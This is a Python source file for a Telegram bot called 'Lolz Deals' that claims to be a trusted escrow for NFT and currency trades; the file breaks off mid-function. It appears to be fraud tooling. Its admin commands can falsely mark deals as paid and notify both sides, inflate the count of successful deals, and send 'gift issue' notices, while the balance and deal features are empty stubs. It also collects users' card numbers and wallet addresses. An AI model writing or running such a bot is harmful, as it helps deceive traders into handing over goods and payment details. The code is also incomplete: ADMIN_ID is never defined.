import os
import logging
import asyncio
import time
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from dotenv import load_dotenv
from aiohttp import web

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
if not TOKEN:
    raise ValueError("BOT_TOKEN не задан в .env")

BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/KcVyKTVc/IMG-1682.jpg")

storage = MemoryStorage()
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=storage)
logging.basicConfig(level=logging.INFO)

# ---------- Хранилище данных ----------
user_lang = {}
user_balance = {}
user_deals = {}
user_completed_deals = {}
withdraw_requests = []
user_last_message = {}
temp_admins = {}
logs = []
user_requisites = {}

# ============================================================
# ПРЕМИУМ-ЭМОДЗИ ДЛЯ ТЕКСТА
# ============================================================
EMOJI_TROPHY    = '<tg-emoji emoji-id="5893255507380014983">🏆</tg-emoji>'
EMOJI_LIGHTNING = '<tg-emoji emoji-id="5456140674028019486">⚡</tg-emoji>'
EMOJI_ROBOT     = '<tg-emoji emoji-id="5794164805065514131">🤖</tg-emoji>'
EMOJI_SHIELD    = '<tg-emoji emoji-id="5794085322400733645">🛡</tg-emoji>'
EMOJI_MONEY     = '<tg-emoji emoji-id="5794280000383358988">💰</tg-emoji>'
EMOJI_PACKAGE   = '<tg-emoji emoji-id="5794241397217304511">📦</tg-emoji>'
EMOJI_MEGAPHONE = '<tg-emoji emoji-id="5893290369629556374">📢</tg-emoji>'
EMOJI_GLOSSARY  = '<tg-emoji emoji-id="5893255507380014983">📖</tg-emoji>'
EMOJI_PIN       = '<tg-emoji emoji-id="5253961389285845297">📌</tg-emoji>'
EMOJI_DIAMOND   = '<tg-emoji emoji-id="5377620962390857342">💎</tg-emoji>'
EMOJI_CARD      = '<tg-emoji emoji-id="5445353829304387411">💳</tg-emoji>'
EMOJI_STAR      = '<tg-emoji emoji-id="5438496463044752972">⭐️</tg-emoji>'
EMOJI_COIN      = '<tg-emoji emoji-id="5379773896352355687">🪙</tg-emoji>'

# ============================================================
# ID ПРЕМИУМ-ЭМОДЗИ ДЛЯ ИНЛАЙН-КНОПОК
# ============================================================
CUSTOM_EMOJI_BALANCE    = "6041730074376410123"
CUSTOM_EMOJI_DEALS      = "5417924076503062111"
CUSTOM_EMOJI_REFERRALS  = "5357080225463149588"
CUSTOM_EMOJI_LANG       = "5197269100878907942"
CUSTOM_EMOJI_REQUISITES = "6084717714847306634"
CUSTOM_EMOJI_CREATE     = "6084717714847306634"
CUSTOM_EMOJI_SUPPORT    = "5447410659077661506"
CUSTOM_EMOJI_COPY       = "6084717714847306634"
CUSTOM_EMOJI_BACK       = "5197269100878907942"
CUSTOM_EMOJI_SEARCH     = "6084717714847306634"
CUSTOM_EMOJI_WITHDRAW   = "6041730074376410123"
CUSTOM_EMOJI_TRANSACT   = "5794241397217304511"
CUSTOM_EMOJI_TON        = "5301166339749070453"
CUSTOM_EMOJI_CARD_BTN   = "5197434882321567830"
CUSTOM_EMOJI_STARS_BTN  = "5897792062291449826"
CUSTOM_EMOJI_USDT       = "5474537505015486009"
CUSTOM_EMOJI_BTC        = "5348296214183950233"

# ---------- FSM для редактирования реквизитов ----------
class RequisitesEdit(StatesGroup):
    waiting_ton = State()
    waiting_card = State()
    waiting_stars = State()
    waiting_usdt = State()
    waiting_btc = State()

def get_user_requisites(user_id: int):
    return user_requisites.get(user_id, {
        'ton': '—',
        'card': '—',
        'stars': '—',
        'usdt': '—',
        'btc': '—',
        'updated_at': None
    })

def save_user_requisites(user_id: int, data: dict):
    if user_id not in user_requisites:
        user_requisites[user_id] = {}
    user_requisites[user_id].update(data)
    user_requisites[user_id]['updated_at'] = datetime.now().strftime("%H:%M")

# ---------- Валидация ----------
def validate_ton(value: str) -> bool:
    return len(value.strip()) > 5

def validate_card(value: str) -> bool:
    return bool(re.fullmatch(r'\d{16}', value.strip()))

def validate_stars(value: str) -> bool:
    return bool(re.fullmatch(r'@[\w_]+', value.strip()))

def validate_usdt(value: str) -> bool:
    return bool(re.fullmatch(r'T[1-9A-HJ-NP-Za-km-z]{33}', value.strip()))

def validate_btc(value: str) -> bool:
    return len(value.strip()) > 25

# ---------- Тексты ----------
REF_LINK_TEMPLATE = "https://t.me/lolzgaranterbot?start=ref{user_id}"

TEXTS = {
    'ru': {
        'welcome': (
            f"<b>{EMOJI_TROPHY} Добро пожаловать в Lolz Deals</b>\n\n"
            f"<blockquote><b>{EMOJI_ROBOT} Ваш надёжный P2P-гарант:</b>\n"
            f"— <b>Автоматические сделки</b> с NFT и валютами\n"
            f"— {EMOJI_SHIELD} <b>Полная защита</b> обеих сторон\n"
            f"— {EMOJI_MONEY} <b>Реферальная программа</b> — <i>50% от комиссии</i>\n"
            f"— {EMOJI_PACKAGE} <b>Передача товаров</b> через менеджера: @LZSupp</blockquote>\n\n"
            f"{EMOJI_MEGAPHONE} <b>Канал:</b> @LiveLolz"
        ),
        'lang_prompt': f"<b>{EMOJI_GLOSSARY} Выберите язык:</b>",
        'lang_ru': "Русский",
        'lang_en': "English",
        'referral': (
            f"<b>{EMOJI_MONEY} Реферальная программа</b>\n\n"
            f"<blockquote><b>Ваша ссылка:</b>\n"
            f"<code>{REF_LINK_TEMPLATE}</code>\n"
            f"<b>Рефералов:</b> 0\n"
            f"<b>Заработано:</b> 0.0 TON</blockquote>\n\n"
            f"<b>Бонус:</b> 50% от комиссии с каждой сделки реферала!"
        ),
        'copy_btn': "Скопировать реф. ссылку",
        'back_btn': "Назад в меню",
        'balance': "Баланс",
        'deals': "Мои сделки",
        'referrals_btn': "Рефералы",
        'lang_btn': "Язык / Lang",
        'requisites': "Мои реквизиты",
        'create': "Создать сделку",
        'support': "Техподдержка",
        'deals_title': "Мои сделки",
        'deals_stats': f"Всего: {{total}} {EMOJI_TROPHY} Завершено: {{completed}} {EMOJI_PACKAGE}",
        'deals_list_empty': "У вас пока нет сделок.",
        'search_btn': f"{EMOJI_PACKAGE} Поиск по коду",
        'search_prompt': "Введите код сделки (например, Yi4qbQ98):",
        'deal_not_found': "Сделка с кодом {code} не найдена.",
        'deal_details': (
            "<b>Детали сделки #{code}</b>\n\n"
            "Покупатель: @{buyer}\n"
            "Продавец: @{seller}\n"
            "Сумма: {amount} {currency}\n"
            "Время: {time}\n"
            "Дата: {date}"
        ),
        'balance_title': f"{EMOJI_MONEY} Ваш баланс:",
        'balance_empty': "Ваш баланс пока пуст",
        'balance_amount': "Ваш баланс: {amount} TON",
        'completed_deals': "Завершённых сделок: {completed}",
        'withdraw_need': "Для вывода средств необходимо минимум 2 завершённых сделки",
        'withdraw_btn': f"{EMOJI_LIGHTNING} Вывод средств",
        'transactions_btn': f"{EMOJI_PACKAGE} Транзакции",
        'transactions_empty': "История транзакций пуста.",
        'withdraw_form_requisites': "Введите ваши реквизиты для вывода (кошелёк, карта и т.п.):",
        'withdraw_form_amount': "Введите сумму для вывода (доступно {amount} TON):",
        'withdraw_too_much': "Сумма превышает доступный баланс.",
        'withdraw_success': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON отправлена! Ожидайте подтверждения администратора.",
        'withdraw_fail': "Ошибка при создании заявки. Попробуйте позже.",
        'admin_panel': (
            f"{EMOJI_SHIELD} <b>Админ-панель</b>\n\n"
            f"{EMOJI_ROBOT} <b>Доступные команды:</b>\n"
            f"/hyteam — показать эту панель\n"
            f"/vvteam — заявки на вывод\n"
            f"/chat [@user или id] [текст] — ответить пользователю\n"
            f"/hostlebuy [код] — отметить оплату сделки\n"
            f"/ref [код] — уведомить о проблеме с подарком\n"
            f"/boost_success [число] — увеличить счётчик успешных сделок\n"
            f"/giveadmin [@user или id] [время] — выдать админку (1m,1h,1d,1w,1M,1y)\n"
            f"/addbalance [id] [сумма] — начислить баланс\n"
            f"/logs — просмотр логов"
        ),
        'admin_no_access': f"{EMOJI_SHIELD} У вас нет доступа к этой команде.",
        'admin_withdraw_list': "Заявки на вывод:\n{list}",
        'admin_withdraw_empty': "Нет активных заявок на вывод.",
        'admin_withdraw_confirm': f"{EMOJI_MONEY} Заявка на вывод {{amount}} TON для пользователя {{user}} подтверждена!",
        'admin_withdraw_error': "Ошибка подтверждения.",
        'chat_success': "Сообщение отправлено пользователю.",
        'chat_fail': "Не удалось отправить сообщение.",
        'chat_no_deal': "У вас нет сделок с этим пользователем.",
        'chat_not_first': "Пользователь не писал в поддержку.",
        'chat_limit': "Превышен лимит сообщений для этой сделки (макс. 10).",
        'hostlebuy_success': f"{EMOJI_MONEY} Сделка {{code}} отмечена как оплаченная, уведомления отправлены.",
        'hostlebuy_fail': "Сделка не найдена или уже оплачена.",
        'ref_success': f"{EMOJI_MEGAPHONE} Уведомление о проблеме с подарком отправлено участникам сделки {{code}}.",
        'ref_fail': "Сделка не найдена или неактивна.",
        'boost_success': f"{EMOJI_TROPHY} Счётчик успешных сделок увеличен на {{num}}.",
        'boost_fail': "Введите число.",
        'giveadmin_success': f"{EMOJI_SHIELD} Пользователь {{user}} получил права администратора на {{time_str}}.",
        'giveadmin_fail': "Некорректный формат времени. Используйте: 1m, 1h, 1d, 1w, 1M, 1y",
        'addbalance_success': f"{EMOJI_MONEY} Пользователю {{user}} начислено {{amount}} TON. Новый баланс: {{new_balance}} TON.",
        'addbalance_fail': "Неверный формат. Используйте: /addbalance [id] [сумма]",
        'addbalance_user_not_found': "Пользователь с ID {user} не найден.",
        'logs_header': f"{EMOJI_GLOSSARY} Логи действий:\n\n",
        'logs_empty': "Логов пока нет.",
        'logs_entry': "{time} | {user} | {action} | {data}",
        'temporarily_unavailable': f"{EMOJI_PACKAGE} Функция временно недоступна. Скоро появится!",
        'support_contact': f"{EMOJI_SHIELD} Техподдержка\n\nСвяжитесь с нашим менеджером:\n@boyfrer",
        # ---------- Реквизиты ----------
        'requisites_title': f"{EMOJI_PIN} <b>Мои реквизиты</b>",
        'requisites_body': (
            f"<blockquote>{EMOJI_DIAMOND} <b>TON-кошелёк:</b>\n"
            f"<code>{{ton}}</code>\n\n"
            f"{EMOJI_CARD} <b>Карта:</b>\n"
            f"<code>{{card}}</code>\n\n"
            f"{EMOJI_STAR} <b>Stars:</b>\n"
            f"<code>{{stars}}</code>\n\n"
            f"{EMOJI_MONEY} <b>USDT (TRC20):</b>\n"
            f"<code>{{usdt}}</code>\n\n"
            f"{EMOJI_COIN} <b>BTC:</b>\n"
            f"<code>{{btc}}</code></blockquote>\n\n"
            f"<i>изменено {{time}}</i>"
        ),
        'requisites_buttons': {
            'ton': f"{EMOJI_DIAMOND} TON-кошелёк",
            'card': f"{EMOJI_CARD} Карта",
            'stars': f"{EMOJI_STAR} Stars",
            'usdt': f"{EMOJI_MONEY} USDT-кошелёк",
            'btc': f"{EMOJI_COIN} BTC-кошелёк"
        },
        'requisites_edit_prompt': "Введите новый {field}:",
        'requisites_edit_invalid': "Некорректный формат. Попробуйте снова.",
        'requisites_edit_success': "Данные обновлены!",
    },
    'en': {
        'welcome': (
            f"<b>{EMOJI_TROPHY} Welcome to Lolz Deals</b>\n\n"
            f"<blockquote><b>{EMOJI_ROBOT} Your trusted P2P guarantor:</b>\n"
            f"— <b>Automated deals</b> with NFTs and currencies\n"
            f"— {EMOJI_SHIELD} <b>Full protection</b> for both parties\n"
            f"— {EMOJI_MONEY} <b>Referral program</b> — <i>50% of fee</i>\n"
            f"— {EMOJI_PACKAGE} <b>Goods transfer</b> via manager: @LZSupp</blockquote>\n\n"
            f"{EMOJI_MEGAPHONE} <b>Channel:</b> @LiveLolz"
        ),
        'lang_prompt': f"<b>{EMOJI_GLOSSARY} Select language:</b>",
        'lang_ru': "Russian",
        'lang_en': "English",
        'referral': (
            f"<b>{EMOJI_MONEY} Referral program</b>\n\n"
            f"<blockquote><b>Your referral link:</b>\n"
            f"<code>{REF_LINK_TEMPLATE}</code>\n"
            f"<b>Referrals:</b> 0\n"
            f"<b>Earned:</b> 0.0 TON</blockquote>\n\n"
            f"<b>Bonus:</b> 50% of commission from each referral deal!"
        ),
        'copy_btn': "Copy referral link",
        'back_btn': "Back to menu",
        'balance': "Balance",
        'deals': "My deals",
        'referrals_btn': "Referrals",
        'lang_btn': "Language / Lang",
        'requisites': "My requisites",
        'create': "Create deal",
        'support': "Support",
        'deals_title': "My deals",
        'deals_stats': f"Total: {{total}} {EMOJI_TROPHY} Completed: {{completed}} {EMOJI_PACKAGE}",
        'deals_list_empty': "You have no deals yet.",
        'search_btn': f"{EMOJI_PACKAGE} Search by code",
        'search_prompt': "Enter deal code (e.g., Yi4qbQ98):",
        'deal_not_found': "Deal with code {code} not found.",
        'deal_details': (
            "<b>Deal details #{code}</b>\n\n"
            "Buyer: @{buyer}\n"
            "Seller: @{seller}\n"
            "Amount: {amount} {currency}\n"
            "Time: {time}\n"
            "Date: {date}"
        ),
        'balance_title': f"{EMOJI_MONEY} Your balance:",
        'balance_empty': "Your balance is empty",
        'balance_amount': "Your balance: {amount} TON",
        'completed_deals': "Completed deals: {completed}",
        'withdraw_need': "You need at least 2 completed deals to withdraw",
        'withdraw_btn': f"{EMOJI_LIGHTNING} Withdraw",
        'transactions_btn': f"{EMOJI_PACKAGE} Transactions",
        'transactions_empty': "Transaction history is empty.",
        'withdraw_form_requisites': "Enter your withdrawal requisites (wallet, card, etc.):",
        'withdraw_form_amount': "Enter amount to withdraw (available {amount} TON):",
        'withdraw_too_much': "Amount exceeds available balance.",
        'withdraw_success': f"{EMOJI_MONEY} Withdraw request for {{amount}} TON sent! Wait for admin confirmation.",
        'withdraw_fail': "Error creating request. Try again later.",
        'admin_panel': (
            f"{EMOJI_SHIELD} <b>Admin panel</b>\n\n"
            f"{EMOJI_ROBOT} <b>Available commands:</b>\n"
            f"/hyteam — show this panel\n"
            f"/vvteam — withdrawal requests\n"
            f"/chat [@user or id] [text] — reply to user\n"
            f"/hostlebuy [code] — mark deal as paid\n"
            f"/ref [code] — notify about gift issue\n"
            f"/boost_success [number] — increase successful deals count\n"
            f"/giveadmin [@user or id] [time] — grant admin (1m,1h,1d,1w,1M,1y)\n"
            f"/addbalance [id] [amount] — add balance\n"
            f"/logs — view logs"
        ),
        'admin_no_access': f"{EMOJI_SHIELD} You don't have access to this command.",
        'admin_withdraw_list': "Withdrawal requests:\n{list}",
        'admin_withdraw_empty': "No active withdrawal requests.",
        'admin_withdraw_confirm': f"{EMOJI_MONEY} Withdrawal request for {{amount}} TON from user {{user}} confirmed!",
        'admin_withdraw_error': "Error confirming.",
        'chat_success': "Message sent to user.",
        'chat_fail': "Failed to send message.",
        'chat_no_deal': "You have no deals with this user.",
        'chat_not_first': "User hasn't contacted support first.",
        'chat_limit': "Message limit exceeded for this deal (max 10).",
        'hostlebuy_success': f"{EMOJI_MONEY} Deal {{code}} marked as paid, notifications sent.",
        'hostlebuy_fail': "Deal not found or already paid.",
        'ref_success': f"{EMOJI_MEGAPHONE} Gift issue notification sent to participants of deal {{code}}.",
        'ref_fail': "Deal not found or inactive.",
        'boost_success': f"{EMOJI_TROPHY} Successful deals count increased by {{num}}.",
        'boost_fail': "Enter a number.",
        'giveadmin_success': f"{EMOJI_SHIELD} User {{user}} granted admin rights for {{time_str}}.",
        'giveadmin_fail': "Invalid time format. Use: 1m, 1h, 1d, 1w, 1M, 1y",
        'addbalance_success': f"{EMOJI_MONEY} User {{user}} got {{amount}} TON. New balance: {{new_balance}} TON.",
        'addbalance_fail': "Invalid format. Use: /addbalance [id] [amount]",
        'addbalance_user_not_found': "User with ID {user} not found.",
        'logs_header': f"{EMOJI_GLOSSARY} Action logs:\n\n",
        'logs_empty': "No logs yet.",
        'logs_entry': "{time} | {user} | {action} | {data}",
        'temporarily_unavailable': f"{EMOJI_PACKAGE} Feature temporarily unavailable. Coming soon!",
        'support_contact': f"{EMOJI_SHIELD} Support\n\nContact our manager:\n@boyfrer",
        # ---------- Requisites ----------
        'requisites_title': f"{EMOJI_PIN} <b>My requisites</b>",
        'requisites_body': (
            f"<blockquote>{EMOJI_DIAMOND} <b>TON wallet:</b>\n"
            f"<code>{{ton}}</code>\n\n"
            f"{EMOJI_CARD} <b>Card:</b>\n"
            f"<code>{{card}}</code>\n\n"
            f"{EMOJI_STAR} <b>Stars:</b>\n"
            f"<code>{{stars}}</code>\n\n"
            f"{EMOJI_MONEY} <b>USDT (TRC20):</b>\n"
            f"<code>{{usdt}}</code>\n\n"
            f"{EMOJI_COIN} <b>BTC:</b>\n"
            f"<code>{{btc}}</code></blockquote>\n\n"
            f"<i>changed {{time}}</i>"
        ),
        'requisites_buttons': {
            'ton': f"{EMOJI_DIAMOND} TON wallet",
            'card': f"{EMOJI_CARD} Card",
            'stars': f"{EMOJI_STAR} Stars",
            'usdt': f"{EMOJI_MONEY} USDT wallet",
            'btc': f"{EMOJI_COIN} BTC wallet"
        },
        'requisites_edit_prompt': "Enter new {field}:",
        'requisites_edit_invalid': "Invalid format. Try again.",
        'requisites_edit_success': "Data updated!",
    }
}

# ---------- Вспомогательные функции ----------
def get_text(user_id: int, key: str) -> str:
    lang = user_lang.get(user_id, 'ru')
    return TEXTS[lang].get(key, TEXTS['ru'][key])

def get_ref_link(user_id: int) -> str:
    return REF_LINK_TEMPLATE.format(user_id=user_id)

def get_user_balance(user_id: int) -> float:
    return user_balance.get(user_id, 0.0)

def get_user_completed_deals(user_id: int) -> int:
    return user_completed_deals.get(user_id, 0)

def is_admin(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    if user_id in temp_admins and temp_admins[user_id] > time.time():
        return True
    return False

def log_action(user_id: int, action: str, data: str = "", ip: str = ""):
    logs.append({
        'time': datetime.now().isoformat(),
        'user': user_id,
        'action': action,
        'data': data,
        'ip': ip
    })
    if len(logs) > 1000:
        logs.pop(0)

# ---------- Удаление предыдущего сообщения ----------
async def delete_previous(user_id: int, chat_id: int):
    if user_id in user_last_message:
        try:
            await bot.delete_message(chat_id, user_last_message[user_id])
        except:
            pass
        del user_last_message[user_id]

# ---------- Отправка с баннером ----------
async def send_with_banner(target, text, keyboard=None, parse_mode="HTML"):
    user_id = target.from_user.id if hasattr(target, 'from_user') else target.chat.id
    chat_id = target.chat.id if hasattr(target, 'chat') else target.message.chat.id
    await delete_previous(user_id, chat_id)
    try:
        if isinstance(target, types.Message):
            msg = await target.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
        else:
            msg = await target.message.answer_photo(photo=BANNER_URL, caption=text, parse_mode=parse_mode, reply_markup=keyboard)
        user_last_message[user_id] = msg.message_id
    except Exception as e:
        logging.error(f"Ошибка отправки баннера: {e}")
        try:
            if isinstance(target, types.Message):
                msg = await target.answer(text, parse_mode=None, reply_markup=keyboard)
            else:
                msg = await target.message.answer(text, parse_mode=None, reply_markup=keyboard)
            user_last_message[user_id] = msg.message_id
        except Exception as e2:
            logging.error(f"Ошибка отправки текста: {e2}")
            if isinstance(target, types.Message):
                msg = await target.answer("Произошла ошибка. Попробуйте позже.")
            else:
                msg = await target.message.answer("Произошла ошибка. Попробуйте позже.")
            user_last_message[user_id] = msg.message_id

# ---------- Отправка главного меню ----------
async def send_main_menu(target, user_id: int):
    text = get_text(user_id, 'welcome')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_text(user_id, 'balance'), icon_custom_emoji_id=CUSTOM_EMOJI_BALANCE, callback_data="balance"),
            InlineKeyboardButton(text=get_text(user_id, 'deals'), icon_custom_emoji_id=CUSTOM_EMOJI_DEALS, callback_data="deals")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'referrals_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_REFERRALS, callback_data="referrals"),
            InlineKeyboardButton(text=get_text(user_id, 'lang_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_LANG, callback_data="lang")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'requisites'), icon_custom_emoji_id=CUSTOM_EMOJI_REQUISITES, callback_data="requisites"),
            InlineKeyboardButton(text=get_text(user_id, 'create'), icon_custom_emoji_id=CUSTOM_EMOJI_CREATE, callback_data="create")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'support'), icon_custom_emoji_id=CUSTOM_EMOJI_SUPPORT, callback_data="support")
        ]
    ])
    await send_with_banner(target, text, keyboard)

# ---------- Команда /start ----------
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if user_id not in user_lang:
        user_lang[user_id] = 'ru'
    await send_main_menu(message, user_id)
    log_action(user_id, "start", "запуск бота")

# ---------- Кнопка "Баланс" (заглушка) ----------
@dp.callback_query(lambda c: c.data == "balance")
async def cb_balance(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = get_text(user_id, 'temporarily_unavailable')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

# ---------- Кнопка "Мои сделки" (заглушка) ----------
@dp.callback_query(lambda c: c.data == "deals")
async def cb_deals(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = get_text(user_id, 'temporarily_unavailable')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

# ---------- Кнопка "Техподдержка" ----------
@dp.callback_query(lambda c: c.data == "support")
async def cb_support(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = get_text(user_id, 'support_contact')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

# ---------- Рефералы ----------
@dp.callback_query(lambda c: c.data == "referrals")
async def cb_referrals(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    ref_text = get_text(user_id, 'referral')
    ref_link = get_ref_link(user_id)
    ref_text = ref_text.replace(REF_LINK_TEMPLATE, ref_link)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=get_text(user_id, 'copy_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_COPY, callback_data="copy_ref")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
        ]
    ])
    await send_with_banner(callback, ref_text, keyboard)
    await callback.answer()
    log_action(user_id, "referrals", "просмотр рефералов")

@dp.callback_query(lambda c: c.data == "copy_ref")
async def cb_copy_ref(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    ref_link = get_ref_link(user_id)
    await callback.answer(f"{ref_link}", show_alert=True)
    log_action(user_id, "copy_ref", "копирование реферальной ссылки")

# ---------- Язык ----------
@dp.callback_query(lambda c: c.data == "lang")
async def cb_lang(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = get_text(user_id, 'lang_prompt')
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=f"🇷🇺 {get_text(user_id, 'lang_ru')}", callback_data="lang_ru"),
            InlineKeyboardButton(text=f"🇺🇸 {get_text(user_id, 'lang_en')}", callback_data="lang_en")
        ],
        [
            InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")
        ]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()

@dp.callback_query(lambda c: c.data.startswith("lang_"))
async def cb_lang_set(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    lang_code = callback.data.split("_")[1]
    user_lang[user_id] = lang_code
    await send_main_menu(callback, user_id)
    await callback.answer()
    log_action(user_id, "lang_change", f"язык {lang_code}")

# ---------- Назад в меню ----------
@dp.callback_query(lambda c: c.data == "back_to_menu")
async def cb_back_to_menu(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    await send_main_menu(callback, user_id)
    await callback.answer()

# ---------- Кнопка "Создать сделку" (заглушка) ----------
@dp.callback_query(lambda c: c.data == "create")
async def cb_create(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    text = f"{EMOJI_PACKAGE} Создание сделки (заглушка)" if user_lang.get(user_id, 'ru') == 'ru' else f"{EMOJI_PACKAGE} Create deal (stub)"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_text(user_id, 'back_btn'), icon_custom_emoji_id=CUSTOM_EMOJI_BACK, callback_data="back_to_menu")]
    ])
    await send_with_banner(callback, text, keyboard)
    await callback.answer()
    log_action(user_id, "create_deal", "создание сделки (заглушка)")

# ============================================================
# МОИ РЕКВИЗИТЫ
# ============================================================

async def show_requisites(target, user_id: int):
    req = get_user_requisites(user_id)
    ton = req['ton']
    card = req['card']
    stars = req['stars']
    usdt = req['usdt']
    btc = req['btc']
    updated = req['updated_at'] if req['updated_at'] else 'никогда'
    
    title = get_text(user_id, 'requisites_title')
    body = get_text(user_id, 'requisites_body').format(
        ton=ton, card=card, stars=stars, usdt=usdt, btc=btc, time=updated
    )
    text = f"{title}\n\n{body}"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=get_text(user_id, 'requisites_buttons')['ton'],
                icon_custom_emoji_id=CUSTOM_EMOJI_TON,
                callback_data="edit_ton"
            )
        ],
        [
            InlineKeyboardButton(
                text=get_text(user_id, 'requisites_buttons')['card'],
                icon_custom_emoji_id=CUSTOM_EMOJI_CARD_BTN,
                callback_data="edit_card"
            )
        ],
        [
            InlineKeyboardButton(
                text=get_text(user_id, 'requisites_buttons')['stars'],
                icon_custom_emoji_id=CUSTOM_EMOJI_STARS_BTN,
                callback_data="edit_stars"
            )
        ],
        [
            InlineKeyboardButton(
                text=get_text(user_id, 'requisites_buttons')['usdt'],
                icon_custom_emoji_id=CUSTOM_EMOJI_USDT,
                callback_data="edit_usdt"
            )
        ],
        [
            InlineKeyboardButton(
                text=get_text(user_id, 'requisites_buttons')['btc'],
                icon_custom_emoji_id=CUSTOM_EMOJI_BTC,
                callback_data="edit_btc"
            )
        ],
        [
            InlineKeyboardButton(
                text=get_text(user_id, 'back_btn'),
                icon_custom_emoji_id=CUSTOM_EMOJI_BACK,
                callback_data="back_to_menu"
            )
        ]
    ])
    await send_with_banner(target, text, keyboard)

@dp.callback_query(lambda c: c.data == "requisites")
async def cb_requisites(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    await show_requisites(callback, user_id)
    await callback.answer()

# ---------- Редактирование полей ----------
@dp.callback_query(lambda c: c.data == "edit_ton")
async def edit_ton(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_ton)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="TON-кошелёк"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_card")
async def edit_card(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_card)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="карта (16 цифр)"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_stars")
async def edit_stars(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_stars)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="Stars (@username)"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_usdt")
async def edit_usdt(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_usdt)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="USDT (TRC20 адрес)"))
    await callback.answer()

@dp.callback_query(lambda c: c.data == "edit_btc")
async def edit_btc(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    await state.set_state(RequisitesEdit.waiting_btc)
    await callback.message.answer(get_text(user_id, 'requisites_edit_prompt').format(field="BTC-адрес"))
    await callback.answer()

# ---------- Обработчики ввода ----------
@dp.message(RequisitesEdit.waiting_ton)
async def process_ton(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_ton(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'ton': value})
    await state.clear()
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"ton обновлён")

@dp.message(RequisitesEdit.waiting_card)
async def process_card(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_card(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'card': value})
    await state.clear()
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"card обновлён")

@dp.message(RequisitesEdit.waiting_stars)
async def process_stars(message: Message, state: FSMContext):
    user_id = message.from_user.id
    value = message.text.strip()
    if not validate_stars(value):
        await message.answer(get_text(user_id, 'requisites_edit_invalid'))
        return
    save_user_requisites(user_id, {'stars': value})
    await state.clear()
    await show_requisites(message, user_id)
    log_action(user_id, "edit_requisites", f"stars обновлён")

@dp.message(RequisitesEdit.waiting_usdt)
async def process_usdt(message: Message, state: FSMContext):
    user_id = message.from_user.id
